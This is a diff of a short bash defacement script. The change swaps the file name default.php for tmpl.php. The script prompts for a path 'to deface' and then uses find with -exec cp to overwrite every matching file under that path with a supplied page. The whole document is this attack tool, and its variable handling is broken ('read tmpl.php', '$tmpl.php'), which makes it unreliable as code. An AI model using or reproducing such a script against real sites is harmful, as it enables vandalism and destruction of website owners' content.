@@ -1,11 +1,11 @@
 #!/bin/bash
-echo '[+] your default.php path on the server'
-read default.php 
+echo '[+] your tmpl.php path on the server'
+read tmpl.php 
 echo
 echo '[+] enter the path To deface '
 read path
 echo
 echo '[+] Starting ........'
-find $path -name "default.php.*" -exec cp $default.php {} \;
+find $path -name "tmpl.php.*" -exec cp $tmpl.php {} \;
 echo 
 echo '[+] Done !'
